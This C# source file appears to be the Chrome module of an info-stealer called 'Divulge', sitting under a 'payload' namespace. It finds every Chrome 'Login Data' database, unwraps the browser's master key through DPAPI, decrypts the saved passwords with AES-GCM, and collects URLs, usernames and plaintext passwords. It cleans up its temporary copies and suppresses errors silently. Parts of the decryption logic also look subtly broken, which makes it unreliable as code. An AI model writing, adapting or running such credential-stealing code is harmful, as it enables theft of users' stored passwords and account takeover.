using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Security.Cryptography;
using Newtonsoft.Json.Linq;
using Divulge.payload.Components.Helpers;
using Divulge.payload.Components.Algorithms;
using Divulge.payload.Components.Utilities;

namespace Divulge.payload.Components.Browsers
{
    internal static class Chrome
    {
        private static readonly string _localStatePath = Path.Combine(Paths.LocalAppData, "Google", "Chrome", "User Data", "Local State");
        private static readonly string _userDataPath = Path.Combine(Paths.LocalAppData, "Google", "Chrome", "User Data");

        public static void Extract()
        {
            if (!File.Exists(_localStatePath))
                return;

            string masterKey = GetMasterKey();
            if (string.IsNullOrEmpty(masterKey))
                return;

            var loginDataFiles = Directory.GetFiles(_userDataPath, "Login Data", SearchOption.AllDirectories)
                                          .Where(path => !path.Contains("System Profile")).ToList();

            foreach (var file in loginDataFiles)
            {
                string tempCopy = file + "_tmp";
                try
                {
                    File.Copy(file, tempCopy, true);
                    using (var conn = new SQLite(tempCopy))
                    {
                        var rows = conn.ReadTable("logins");
                        for (int i = 0; i < rows.RowCount; i++)
                        {
                            string url = rows.GetValue(i, "origin_url");
                            string username = rows.GetValue(i, "username_value");
                            string encPassword = rows.GetValue(i, "password_value");

                            string password = DecryptPassword(encPassword, masterKey);
                            if (!string.IsNullOrEmpty(password))
                            {
                                DataHelper.AddCredential("Chrome", url, username, password);
                            }
                        }
                    }
                }
                catch { }
                finally
                {
                    try { File.Delete(tempCopy); } catch { }
                }
            }
        }

        private static string GetMasterKey()
        {
            try
            {
                string localStateText = File.ReadAllText(_localStatePath);
                var json = JObject.Parse(localStateText);
                string encryptedKeyB64 = json["os_crypt"]["encrypted_key"]?.ToString();
                if (string.IsNullOrEmpty(encryptedKeyB64))
                    return null;

                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyB64);
                if (encryptedKey.Length > 5 && encryptedKey.Take(5).SequenceEqual(Encoding.ASCII.GetBytes("DPAPI")))
                    encryptedKey = encryptedKey.Skip(5).ToArray();

                byte[] masterKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                return Convert.ToBase64String(masterKey);
            }
            catch
            {
                return null;
            }
        }

        private static string DecryptPassword(string encryptedValue, string masterKeyB64)
        {
            try
            {
                byte[] encryptedData = Encoding.Default.GetBytes(encryptedValue);
                if (encryptedData.Length == 0)
                    return null;

                byte[] masterKey = Convert.FromBase64String(masterKeyB64);

                // Check for 'v10' or 'v11' prefix (AES-GCM)
                if (encryptedData.Length > 3 && encryptedData[0] == 'v' && encryptedData[1] == '1' &&
                    (encryptedData[2] == '0' || encryptedData[2] == '1'))
                {
                    int ivLength = 12;
                    int tagLength = 16;

                    byte[] iv = encryptedData.Skip(3).Take(ivLength).ToArray();
                    byte[] cipherText = encryptedData.Skip(3 + ivLength).Take(encryptedData.Length - 3 - ivLength - tagLength).ToArray();
                    byte[] tag = encryptedData.Skip(encryptedData.Length - tagLength).ToArray();

                    byte[] fullCipher = cipherText.Concat(tag).ToArray();

                    using (var aes = new AesGcm(masterKey))
                    {
                        byte[] plainText = new byte[cipherText.Length];
                        aes.Decrypt(iv, fullCipher, null, plainText);
                        return Encoding.UTF8.GetString(plainText);
                    }
                }

                // DPAPI fallback (older versions)
                byte[] decrypted = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                return Encoding.UTF8.GetString(decrypted);
            }
            catch
            {
                return null;
            }
        }
    }
}
